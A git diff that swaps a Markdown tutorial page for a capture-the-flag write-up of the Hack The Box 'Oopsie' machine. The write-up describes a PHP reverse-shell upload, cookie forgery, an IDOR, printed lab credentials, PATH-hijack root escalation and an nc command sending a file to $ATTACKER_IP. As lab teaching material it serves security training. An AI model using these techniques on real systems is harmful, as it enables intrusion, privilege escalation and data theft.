@@ -1,709 +1,164 @@
-# My Open Publishing Space
+# Oopsie Write-up
 
-## Create, Share and Collaborate
-
-![Photo of Mountain](images/mountain.jpg)
-
-[Docsify](https://docsify.js.org/#/) can generate article, portfolio and documentation websites on the fly. Unlike Docusaurus, Hugo and many other Static Site Generators (SSG), it does not generate static html files. Instead, it smartly loads and parses your Markdown content files and displays them as a website.
+![Photo of Cover](images/cover.png)
 
 ## Introduction
 
-**Markdown** is a system-independent markup language that is easier to learn and use than **HTML**.
+The **Oopsie** HTB machine serves as the target for the assessment, focusing on gaining access to both user and root flags.
 
-![The Markdown Mark](images/markdown-red.png)  
-_Figure 1: The Markdown Mark_
+The threat model revolves around a known target IP, allowing communication with the machine. Using Kali Linux as the attack platform, reconnaissance and exploitation techniques are employed to compromise the system.
 
-Some of the key benefits are:
+`TARGET_IP=10.129.188.219`
 
-1. Markdown is simple to learn, with minimal extra characters, so it's also quicker to write content.
-2. Less chance of errors when writing in markdown.
-3. Produces valid XHTML output.
-4. Keeps the content and the visual display separate, so you cannot mess up the look of your site.
-5. Write in any text editor or Markdown application you like.
-6. Markdown is a joy to use!
+`ATTACKER_IP=10.10.15.93`
 
-John Gruber, the author of Markdown, puts it like this:
+During web assessments, especially those that involve authentication mechanisms, it is crucial to examine cookies, sessions, and access control thoroughly. Often, gaining access or achieving Remote Code Execution involves chaining multiple vulnerabilities together, rather than relying on a single exploit.
 
-> The overriding design goal for Markdown’s formatting syntax is to make it as readable as possible. The idea is that a Markdown-formatted document should be publishable as-is, as plain text, without looking like it’s been marked up with tags or formatting instructions. While Markdown’s syntax has been influenced by several existing text-to-HTML filters, the single biggest source of inspiration for Markdown’s syntax is the format of plain text email.
-> -- <cite>John Gruber</cite>
+## Reconaissance
 
+The reconnaissance phase begins with enumeration: a port scan of the victim’s IP address is performed using the Nmap tool to gather useful information, such as open ports, active services and their versions.
 
-Without further delay, let us go over the main elements of Markdown and what the resulting HTML looks like:
+Open ports might indicate services that could have vulnerabilities or weak configurations, making them potential entry points. Additionally, knowing the operating system and software versions can help an attacker choose the appropriate exploits or strategies.
 
-### Headings
+`nmap -sC -sV $TARGET_IP`
 
-Headings from `h1` through `h6` are constructed with a `#` for each level:
+![Photo of Nmap](images/nmap.png)
 
-```markdown
-# h1 Heading
-## h2 Heading
-### h3 Heading
-#### h4 Heading
-##### h5 Heading
-###### h6 Heading
-```
+The Nmap scan reveals that the target system has two open ports: SSH on port 22 and HTTP on port 80:
 
-Renders to:
+- SSH is running OpenSSH 7.6p1 on an Ubuntu-based system, suggesting remote management and shell access are enabled.
+- Apache HTTP Server 2.4.29 is running on port 80, indicating a web server is present, also likely hosted on Ubuntu.
 
-<h1> h1 Heading </h1>
-<h2>  h2 Heading </h2>
-<h3>  h3 Heading </h3>
-<h4>  h4 Heading </h4>
-<h5>  h5 Heading </h5>
-<h6>  h6 Heading </h6>
+The next step is to visit the target IP in a web browser to gather additional information about the web server and its content.
 
-HTML:
+![Photo of Home](images/home.png)
 
-```html
-<h1>h1 Heading</h1>
-<h2>h2 Heading</h2>
-<h3>h3 Heading</h3>
-<h4>h4 Heading</h4>
-<h5>h5 Heading</h5>
-<h6>h6 Heading</h6>
-```
+The homepage reveals useful information about service access. An email address is also visible, which could serve as a target for spearphishing attempts.
 
-### Comments
+The links on the homepage do not point to any actual pages, prompting the decision to perform web enumeration and search for the login page for _Megacorp_'s _Services_. To aid this process, file and directory fuzzing was conducted using Gobuster.
 
-Comments should be HTML compatible
+`gobuster dir --url http://$TARGET_IP/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php`
 
-```html
-<!--
-This is a comment
--->
-```
-Comment below should **NOT** be seen:
+![Photo of Gobuster](images/gobuster.png)
 
-<!--
-This is a comment
--->
+The website does not contain a visible login page. The `/uploads` folder exists but is inaccessible due to forbidden access restrictions. Further investigation requires the use of an additional tool to gather more information.
 
-### Horizontal Rules
+A tool like Burp Suite is suitable for automating the process of crawling and mapping the website. To use it, the browser proxy is manually set to localhost (`127.0.0.1`).
 
-The HTML `<hr>` element is for creating a "thematic break" between paragraph-level elements. In markdown, you can create a `<hr>` with any of the following:
+With Burp Suite set to intercept _off_ (passive mode), refreshing the homepage allows the tool to capture the site map for further analysis.
 
-* `___`: three consecutive underscores
-* `---`: three consecutive dashes
-* `***`: three consecutive asterisks
+The site map reveals the presence of a `/cdn/cgi/login/script.js` file.
 
-renders to:
+## Initial Access
 
-___
+Accessing the URL `http://{TARGET_IP}/cdn-cgi/login` leads to a login page that includes a _Login as Guest_ button. By logging in as a guest, it becomes possible to access the _Repair Management System_ page, which contains a navigation menu:
+
+- the _Account_ page displays a table containing fields such as _Access ID_, _Name_, and _Email_ for the guest user;
+- on the _Uploads_ page, the message "_This action requires super admin rights_" is displayed, indicating restricted access.
+
+![Photo of Burp Suite](images/burpsuite.png)
+
+Note that the `user` and `role` cookie parameters correspond to the _Access ID_ and _Name_ fields found on the guest _Account_ page.
+
+## Discovery / Priviledge Escalation
+
+Observing the _Account_ page URL reveals also a numeric `id` parameter. Modifying its value to `1` grants access to the admin _Repair Management System_ page.
+
+To attempt exploiting a potential IDOR vulnerability, Burp Suite's Intruder can be utilized. The `/cdn-cgi/login/admin.php?content=accounts&id=2` resource is identified from Burp Suite's HTTP history and then sent to Intruder for testing.
+
+The `id` parameter value is chosen as the payload and a custom list of 50 sequential numbers is generated in the options. This method is intended to test the possibility of unauthorized access to other resources. By setting the request to always follow redirections and intercept _on_, the attack begins.
+
+![Photo of Intruder](images/intruder.png)
+
+Analyzing the responses sorted by decreasing length reveals the presence of multiple accounts, including a super admin account.
+
+| id  | Access ID |    Name     |          Email          |
+| :-: | :-------: | :---------: | :---------------------: |
+|  1  |   34322   |    admin    |   admin@megacorp.com    |
+|  2  |   2233    |    guest    |   guest@megacorp.com    |
+|  4  |   8832    |    john     |    john@tafcz.co.uk     |
+| 13  |   57633   |    Peter    |    peter@qpic.co.uk     |
+| 23  |   28832   |    Rafol    |     tom@rafol.co.uk     |
+| 30  |   86575   | super admin | superadmin@megacorp.com |
+
+With the gathered information, cookie manipulation is performed to bypass authentication.
+
+The `user` and `role` guest cookie parameters stored in the browser are modified with the _Access ID_ and name values of the super admin account. This allows access to the _Uploads_ page, where a file uploader is now visible.
+
+## Initial Access / Execution
+
+The next phase involves gaining initial access by uploading a [PHP reverse shell](https://github.com/BlackArch/webshells/blob/master/php/php-reverse-shell.php).The attacker prepares by downloading the reverse shell script and configuring it with the attacker's IP address and a listening port.
+
+Once the script is uploaded, an attempt to access the `/uploads` resource results in a "forbidden" response. A Netcat listener is then initiated on the attacker's machine, ready to catch any incoming connections.
+
+`nc -lvnp 4444`
+
+Execution is triggered by navigating to `/uploads/php-reverse-shell.php` in a browser, which activates the payload. Upon successful connection, the current user on the target system is revealed by executing the `whoami` command.
+
+To enhance control and achieve full interactivity with the compromised system, the shell is upgraded with a Python command, enabling more efficient interaction.
+
+`python3 -c 'import pty; pty.spawn("/bin/bash")'`
+
+![Photo of Netcat](images/netcat.png)
+
+## Lateral Movement / Credential Access
+
+In the lateral movement phase, the target host filesystem enumeration starts by exploring the `/var/www/html/` directory. Commonly utilized in Linux systems, especially in web server configurations such as Apache, the directory stores publicly accessible website files.
+
+The command `cat * | grep -i passw*` is executed inside the `/var/www/html/cdn-cgi/login` directory to search for potential password information or other sensitive data related to credentials. This reveals the password `MEGACORP_4dm1n!!` for the username `admin`. Further investigation into the `db.php` file reveals another valid credential (`M3g4C0rpUs3r!`) for the user `robert`.
+
+The next step involves examining the `/etc/passwd` file to identify system users, where an entry for the user `robert` is found.
+
+After gaining access through the execution of the `su robert` command using the discovered credentials, the contents of the `/home/robert/` directory are explored. Within this directory, further exploration uncovers a hidden secret, the user flag `user.txt`.
+
+![Photo of Netcat Robert](images/netcat_robert.png)
+
+## Priviledge Escalation
+
+Attempting to run `sudo -l` results in a message indicating insufficient privileges for using `sudo`. The `id` command is used next to check the current user's group memberships, revealing that the user `robert` belongs to the `bugtracker` group.
+
+To further investigate the group's permissions, a search is conducted for files across the system (`/`) that are owned by the `bugtracker` group.
+
+`find / -type f -group bugtracker 2> /dev/null`
+
+Upon locating a file named `/usr/bin/bugtracker`, its privileges and type are examined.
+
+`ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker`
+
+The analysis reveals that it is a binary file with SUID permissions, suggesting a potential vector for privilege escalation. The Set User ID (SUID) is a special file permission on Linux and Unix systems that allows an executable to run with the privileges of the file's owner, typically root, instead of the user executing the file.
+
+Upon inspecting the output of several `/usr/bin/bugtracker` executions, it becomes evident that a system command is being called using the `cat` command, but with a relative path instead of an absolute one.
+
+This behavior reveals a potential vulnerability, allowing for privilege escalation to root through a misconfiguration. Within the `/tmp` directory, a shell script is created by writing `/bin/sh` to a file named `cat`.
+
+`echo '/bin/sh' > cat`
+
+The script is then made executable using the `chmod +x cat` command.
+
+This enables path hijacking by modifying the `PATH` environment variable to prioritize the `/tmp` directory, which is writable by all users and non-permanent.
+
+`export PATH=/tmp:$PATH`
+
+The `bugtracker` file can now be exploited to gain shell access by utilizing the altered path. Confirming the current user with `whoami` verifies the success of the exploit.
+
+![Photo of Netcat Root](images/netcat_root.png)
+
+## Exfiltration
+
+Navigating to the `/root` directory grants access to the `root.txt` flag. The next step involves exfiltrating the root flag to the local machine.
+
+A listener is established on the receiving host to capture the flag.
+
+`nc -l -p 8888 > root.txt`
+
+From the target machine, the flag is transferred to the attacker.
+
+`nc -w 3 $ATTACKER_IP 8888 < root.txt`
 
 ---
 
-***
+---
 
+---
 
-### Body Copy
-
-Body copy written as normal, plain text will be wrapped with `<p></p>` tags in the rendered HTML.
-
-So this body copy:
-
-```markdown
-Lorem ipsum dolor sit amet, graecis denique ei vel, at duo primis mandamus. Et legere ocurreret pri, animal tacimates complectitur ad cum. Cu eum inermis inimicus efficiendi. Labore officiis his ex, soluta officiis concludaturque ei qui, vide sensibus vim ad.
-```
-renders to this HTML:
-
-```html
-<p>Lorem ipsum dolor sit amet, graecis denique ei vel, at duo primis mandamus. Et legere ocurreret pri, animal tacimates complectitur ad cum. Cu eum inermis inimicus efficiendi. Labore officiis his ex, soluta officiis concludaturque ei qui, vide sensibus vim ad.</p>
-```
-
-### Emphasis
-
-#### Bold
-For emphasizing a snippet of text with a heavier font-weight.
-
-The following snippet of text is **rendered as bold text**.
-
-```markdown
-**rendered as bold text**
-```
-renders to:
-
-**rendered as bold text**
-
-and this HTML
-
-```html
-<strong>rendered as bold text</strong>
-```
-
-#### Italics
-For emphasizing a snippet of text with italics.
-
-The following snippet of text is _rendered as italicized text_.
-
-```markdown
-_rendered as italicized text_
-```
-
-renders to:
-
-_rendered as italicized text_
-
-and this HTML:
-
-```html
-<em>rendered as italicized text</em>
-```
-
-
-#### strikethrough
-In GFM (GitHub flavored Markdown) you can do strikethroughs.
-
-```markdown
-~~Strike through this text.~~
-```
-Which renders to:
-
-~~Strike through this text.~~
-
-HTML:
-
-```html
-<del>Strike through this text.</del>
-```
-
-### Blockquotes
-For quoting blocks of content from another source within your document.
-
-Add `>` before any text you want to quote.
-
-```markdown
-> **Fusion Drive** combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined.
-```
-
-Renders to:
-
-> **Fusion Drive** combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined.
-
-and this HTML:
-
-```html
-<blockquote>
-  <p><strong>Fusion Drive</strong> combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined.</p>
-</blockquote>
-```
-
-Blockquotes can also be nested:
-
-```markdown
-> Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue.
-Nunc augue augue, aliquam non hendrerit ac, commodo vel nisi.
->> Sed adipiscing elit vitae augue consectetur a gravida nunc vehicula. Donec auctor
-odio non est accumsan facilisis. Aliquam id turpis in dolor tincidunt mollis ac eu diam.
-```
-
-Renders to:
-
-> Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue.
-Nunc augue augue, aliquam non hendrerit ac, commodo vel nisi.
->> Sed adipiscing elit vitae augue consectetur a gravida nunc vehicula. Donec auctor
-odio non est accumsan facilisis. Aliquam id turpis in dolor tincidunt mollis ac eu diam.
-
-### Lists
-
-#### Unordered
-A list of items in which the order of the items does not explicitly matter.
-
-You may use any of the following symbols to denote bullets for each list item:
-
-```markdown
-* valid bullet
-- valid bullet
-+ valid bullet
-```
-
-For example
-
-```markdown
-+ Lorem ipsum dolor sit amet
-+ Consectetur adipiscing elit
-+ Integer molestie lorem at massa
-+ Facilisis in pretium nisl aliquet
-+ Nulla volutpat aliquam velit
-  - Phasellus iaculis neque
-  - Purus sodales ultricies
-  - Vestibulum laoreet porttitor sem
-  - Ac tristique libero volutpat at
-+ Faucibus porta lacus fringilla vel
-+ Aenean sit amet erat nunc
-+ Eget porttitor lorem
-```
-Renders to:
-
-+ Lorem ipsum dolor sit amet
-+ Consectetur adipiscing elit
-+ Integer molestie lorem at massa
-+ Facilisis in pretium nisl aliquet
-+ Nulla volutpat aliquam velit
-  - Phasellus iaculis neque
-  - Purus sodales ultricies
-  - Vestibulum laoreet porttitor sem
-  - Ac tristique libero volutpat at
-+ Faucibus porta lacus fringilla vel
-+ Aenean sit amet erat nunc
-+ Eget porttitor lorem
-
-And this HTML
-
-```html
-<ul>
-  <li>Lorem ipsum dolor sit amet</li>
-  <li>Consectetur adipiscing elit</li>
-  <li>Integer molestie lorem at massa</li>
-  <li>Facilisis in pretium nisl aliquet</li>
-  <li>Nulla volutpat aliquam velit
-    <ul>
-      <li>Phasellus iaculis neque</li>
-      <li>Purus sodales ultricies</li>
-      <li>Vestibulum laoreet porttitor sem</li>
-      <li>Ac tristique libero volutpat at</li>
-    </ul>
-  </li>
-  <li>Faucibus porta lacus fringilla vel</li>
-  <li>Aenean sit amet erat nunc</li>
-  <li>Eget porttitor lorem</li>
-</ul>
-```
-
-#### Ordered
-
-A list of items in which the order of items does explicitly matter.
-
-```markdown
-1. Lorem ipsum dolor sit amet
-2. Consectetur adipiscing elit
-3. Integer molestie lorem at massa
-4. Facilisis in pretium nisl aliquet
-5. Nulla volutpat aliquam velit
-6. Faucibus porta lacus fringilla vel
-7. Aenean sit amet erat nunc
-8. Eget porttitor lorem
-```
-Renders to:
-
-1. Lorem ipsum dolor sit amet
-2. Consectetur adipiscing elit
-3. Integer molestie lorem at massa
-4. Facilisis in pretium nisl aliquet
-5. Nulla volutpat aliquam velit
-6. Faucibus porta lacus fringilla vel
-7. Aenean sit amet erat nunc
-8. Eget porttitor lorem
-
-And this HTML:
-
-```html
-<ol>
-  <li>Lorem ipsum dolor sit amet</li>
-  <li>Consectetur adipiscing elit</li>
-  <li>Integer molestie lorem at massa</li>
-  <li>Facilisis in pretium nisl aliquet</li>
-  <li>Nulla volutpat aliquam velit</li>
-  <li>Faucibus porta lacus fringilla vel</li>
-  <li>Aenean sit amet erat nunc</li>
-  <li>Eget porttitor lorem</li>
-</ol>
-```
-
-**TIP**: If you just use `1.` for each number, Markdown will automatically number each item. For example:
-
-```markdown
-1. Lorem ipsum dolor sit amet
-1. Consectetur adipiscing elit
-1. Integer molestie lorem at massa
-1. Facilisis in pretium nisl aliquet
-1. Nulla volutpat aliquam velit
-1. Faucibus porta lacus fringilla vel
-1. Aenean sit amet erat nunc
-1. Eget porttitor lorem
-```
-
-Renders to:
-
-1. Lorem ipsum dolor sit amet
-2. Consectetur adipiscing elit
-3. Integer molestie lorem at massa
-4. Facilisis in pretium nisl aliquet
-5. Nulla volutpat aliquam velit
-6. Faucibus porta lacus fringilla vel
-7. Aenean sit amet erat nunc
-8. Eget porttitor lorem
-
-### Code
-
-#### Inline code
-Wrap inline snippets of code with `` ` ``.
-
-```markdown
-In this example, `<section></section>` should be wrapped as **code**.
-```
-
-Renders to:
-
-In this example, `<section></section>` should be wrapped with **code**.
-
-HTML:
-
-```html
-<p>In this example, <code>&lt;section&gt;&lt;/section&gt;</code> should be wrapped with <strong>code</strong>.</p>
-```
-
-#### Indented code
-
-Or indent several lines of code by at least four spaces, as in:
-
-<pre>
-  // Some comments
-  line 1 of code
-  line 2 of code
-  line 3 of code
-</pre>
-
-Renders to:
-
-    // Some comments
-    line 1 of code
-    line 2 of code
-    line 3 of code
-
-HTML:
-
-```html
-<pre>
-  <code>
-    // Some comments
-    line 1 of code
-    line 2 of code
-    line 3 of code
-  </code>
-</pre>
-```
-
-
-#### Block code "fences"
-
-Use "fences"  ```` ``` ```` to block in multiple lines of code.
-
-<pre>
-``` markup
-Sample text here...
-```
-</pre>
-
-
-```
-Sample text here...
-```
-
-HTML:
-
-```html
-<pre>
-  <code>Sample text here...</code>
-</pre>
-```
-
-#### Syntax highlighting
-
-GFM, or "GitHub Flavored Markdown" also supports syntax highlighting. To activate it, simply add the file extension of the language you want to use directly after the first code "fence", ` ```js `, and syntax highlighting will automatically be applied in the rendered HTML. For example, to apply syntax highlighting to JavaScript code:
-
-<pre>
-```js
-grunt.initConfig({
-  assemble: {
-    options: {
-      assets: 'docs/assets',
-      data: 'src/data/*.{json,yml}',
-      helpers: 'src/custom-helpers.js',
-      partials: ['src/partials/**/*.{hbs,md}']
-    },
-    pages: {
-      options: {
-        layout: 'default.hbs'
-      },
-      files: {
-        './': ['src/templates/pages/index.hbs']
-      }
-    }
-  }
-};
-```
-</pre>
-
-Renders to:
-
-```js
-grunt.initConfig({
-  assemble: {
-    options: {
-      assets: 'docs/assets',
-      data: 'src/data/*.{json,yml}',
-      helpers: 'src/custom-helpers.js',
-      partials: ['src/partials/**/*.{hbs,md}']
-    },
-    pages: {
-      options: {
-        layout: 'default.hbs'
-      },
-      files: {
-        './': ['src/templates/pages/index.hbs']
-      }
-    }
-  }
-};
-```
-
-### Tables
-Tables are created by adding pipes as dividers between each cell, and by adding a line of dashes (also separated by bars) beneath the header. Note that the pipes do not need to be vertically aligned.
-
-
-```markdown
-| Option | Description |
-| ------ | ----------- |
-| data   | path to data files to supply the data that will be passed into templates. |
-| engine | engine to be used for processing templates. Handlebars is the default. |
-| ext    | extension to be used for dest files. |
-```
-
-Renders to:
-
-| Option | Description |
-| ------ | ----------- |
-| data   | path to data files to supply the data that will be passed into templates. |
-| engine | engine to be used for processing templates. Handlebars is the default. |
-| ext    | extension to be used for dest files. |
-
-And this HTML:
-
-```html
-<table>
-  <tr>
-    <th>Option</th>
-    <th>Description</th>
-  </tr>
-  <tr>
-    <td>data</td>
-    <td>path to data files to supply the data that will be passed into templates.</td>
-  </tr>
-  <tr>
-    <td>engine</td>
-    <td>engine to be used for processing templates. Handlebars is the default.</td>
-  </tr>
-  <tr>
-    <td>ext</td>
-    <td>extension to be used for dest files.</td>
-  </tr>
-</table>
-```
-
-### Right aligned text
-
-Adding a colon on the right side of the dashes below any heading will right align text for that column.
-
-```markdown
-| Option | Description |
-| ------:| -----------:|
-| data   | path to data files to supply the data that will be passed into templates. |
-| engine | engine to be used for processing templates. Handlebars is the default. |
-| ext    | extension to be used for dest files. |
-```
-
-| Option | Description |
-| ------:| -----------:|
-| data   | path to data files to supply the data that will be passed into templates. |
-| engine | engine to be used for processing templates. Handlebars is the default. |
-| ext    | extension to be used for dest files. |
-
-### Links
-
-#### Basic link
-
-```markdown
-[Assemble](http://assemble.io)
-```
-
-Renders to (hover over the link, there is no tooltip):
-
-[Assemble](http://assemble.io)
-
-HTML:
-
-```html
-<a href="http://assemble.io">Assemble</a>
-```
-
-
-#### Add a title
-
-```markdown
-[Upstage](https://github.com/upstage/ "Visit Upstage!")
-```
-
-Renders to (hover over the link, there should be a tooltip):
-
-[Upstage](https://github.com/upstage/ "Visit Upstage!")
-
-HTML:
-
-```html
-<a href="https://github.com/upstage/" title="Visit Upstage!">Upstage</a>
-```
-
-#### Named Anchors
-
-Named anchors enable you to jump to the specified anchor point on the same page. For example, each of these chapters:
-
-```markdown
-# Table of Contents
-  * [Chapter 1](#chapter-1)
-  * [Chapter 2](#chapter-2)
-  * [Chapter 3](#chapter-3)
-```
-will jump to these sections:
-
-```markdown
-### Chapter 1 <a id="chapter-1"></a>
-Content for chapter one.
-
-### Chapter 2 <a id="chapter-2"></a>
-Content for chapter one.
-
-### Chapter 3 <a id="chapter-3"></a>
-Content for chapter one.
-```
-**NOTE** that specific placement of the anchor tag seems to be arbitrary. They are placed inline here since it seems to be unobtrusive, and it works.
-
-### Images
-Images have a similar syntax to links but include a preceding exclamation point.
-
-```markdown
-![Image of Minion](https://octodex.github.com/images/minion.png)
-```
-![Image of Minion](https://octodex.github.com/images/minion.png)
-
-and using a local image (which also displays in GitHub):
-
-```markdown
-![Image of Octocat](images/octocat.jpg)
-```
-![Image of Octocat](images/octocat.jpg)
-
-## Topic One  
-
-Lorem markdownum in maior in corpore ingeniis: causa clivo est. Rogata Veneri terrebant habentem et oculos fornace primusque et pomaria et videri putri, levibus. Sati est novi tenens aut nitidum pars, spectabere favistis prima et capillis in candida spicis; sub tempora, aliquo.
-
-## Topic Two
-
-Lorem markdownum vides aram est sui istis excipis Danai elusaque manu fores.
-Illa hunc primo pinum pertulit conplevit portusque pace *tacuit* sincera. Iam
-tamen licentia exsulta patruelibus quam, deorum capit; vultu. Est *Philomela
-qua* sanguine fremit rigidos teneri cacumina anguis hospitio incidere sceptroque
-telum spectatorem at aequor.
-
-## Topic Three
-
-### Overview
-
-Lorem markdownum vides aram est sui istis excipis Danai elusaque manu fores.
-Illa hunc primo pinum pertulit conplevit portusque pace *tacuit* sincera. Iam
-tamen licentia exsulta patruelibus quam, deorum capit; vultu. Est *Philomela
-qua* sanguine fremit rigidos teneri cacumina anguis hospitio incidere sceptroque
-telum spectatorem at aequor.
-
-### Subtopic One
-
-Lorem markdownum murmure fidissime suumque. Nivea agris, duarum longaeque Ide
-rugis Bacchum patria tuus dea, sum Thyneius liquor, undique. **Nimium** nostri
-vidisset fluctibus **mansit** limite rigebant; enim satis exaudi attulit tot
-lanificae [indice](http://www.mozilla.org/) Tridentifer laesum. Movebo et fugit,
-limenque per ferre graves causa neque credi epulasque isque celebravit pisces.
-
-- Iasone filum nam rogat
-- Effugere modo esse
-- Comminus ecce nec manibus verba Persephonen taxo
-- Viribus Mater
-- Bello coeperunt viribus ultima fodiebant volentem spectat
-- Pallae tempora
-
-#### Fuit tela Caesareos tamen per balatum
-
-De obstruat, cautes captare Iovem dixit gloria barba statque. Purpureum quid
-puerum dolosae excute, debere prodest **ignes**, per Zanclen pedes! *Ipsa ea
-tepebat*, fiunt, Actoridaeque super perterrita pulverulenta. Quem ira gemit
-hastarum sucoque, idem invidet qui possim mactatur insidiosa recentis, **res
-te** totumque [Capysque](http://tumblr.com/)! Modo suos, cum parvo coniuge, iam
-sceleris inquit operatus, abundet **excipit has**.
-
-In locumque *perque* infelix hospite parente adducto aequora Ismarios,
-feritatis. Nomine amantem nexibus te *secum*, genitor est nervo! Putes
-similisque festumque. Dira custodia nec antro inornatos nota aris, ducere nam
-genero, virtus rite.
-
-- Citius chlamydis saepe colorem paludosa territaque amoris
-- Hippolytus interdum
-- Ego uterque tibi canis
-- Tamen arbore trepidosque
-
-#### Colit potiora ungues plumeus de glomerari num
-
-Conlapsa tamen innectens spes, in Tydides studio in puerili quod. Ab natis non
-**est aevi** esse riget agmenque nutrit fugacis.
-
-- Coortis vox Pylius namque herbosas tuae excedere
-- Tellus terribilem saetae Echinadas arbore digna
-- Erraverit lectusque teste fecerat
-
-Suoque descenderat illi; quaeritur ingens cum periclo quondam flaventibus onus
-caelum fecit bello naides ceciderunt cladis, enim. Sunt aliquis.
-
-### Subtopic Two
-
-Lorem *markdownum saxum et* telum revellere in victus vultus cogamque ut quoque
-spectat pestiferaque siquid me molibus, mihi. Terret hinc quem Phoebus? Modo se
-cunctatus sidera. Erat avidas tamen antiquam; ignes igne Pelates
-[morte](http://www.youtube.com/watch?v=MghiBW3r65M) non caecaque canam Ancaeo
-contingat militis concitus, ad!
-
-#### Et omnis blanda fetum ortum levatus altoque
-
-Totos utinamque nutricis. Lycaona cum non sine vocatur tellus campus insignia et
-absumere pennas Cythereiadasque pericula meritumque Martem longius ait moras
-aspiciunt fatorum. Famulumque volvitur vultu terrae ut querellas hosti deponere
-et dixit est; in pondus fonte desertum. Condidit moras, Carpathius viros, tuta
-metum aethera occuluit merito mente tenebrosa et videtur ut Amor et una
-sonantia. Fuit quoque victa et, dum ora rapinae nec ipsa avertere lata, profugum
-*hectora candidus*!
-
-#### Et hanc
-
-Quo sic duae oculorum indignos pater, vis non veni arma pericli! Ita illos
-nitidique! Ignavo tibi in perdam, est tu precantia fuerat
-[revelli](http://jaspervdj.be/).
-
-Non Tmolus concussit propter, et setae tum, quod arida, spectata agitur, ferax,
-super. Lucemque adempto, et At tulit navem blandas, et quid rex, inducere? Plebe
-plus *cum ignes nondum*, fata sum arcus lustraverat tantis!
-
-#### Adulterium tamen instantiaque puniceum et formae patitur
-
-Sit paene [iactantem suos](http://www.metafilter.com/) turbineo Dorylas heros,
-triumphos aquis pavit. Formatae res Aeolidae nomen. Nolet avum quique summa
-cacumine dei malum solus.
-
-1. Mansit post ambrosiae terras
-2. Est habet formidatis grandior promissa femur nympharum
-3. Maestae flumina
-4. Sit more Trinacris vitasset tergo domoque
-5. Anxia tota tria
-6. Est quo faece nostri in fretum gurgite
-
-Themis susurro tura collo: cunas setius *norat*, Calydon. Hyaenam terret credens
-habenas communia causas vocat fugamque roganti Eleis illa ipsa id est madentis
-loca: Ampyx si quis. Videri grates trifida letum talia pectus sequeretur erat
-ignescere eburno e decolor terga.
-
-> Note: Example page content from [GetGrav.org](https://learn.getgrav.org/17/content/markdown), included to demonstrate the portability of Markdown-based content
+Resources: official and non-official write-ups, Google search, ChatGPT
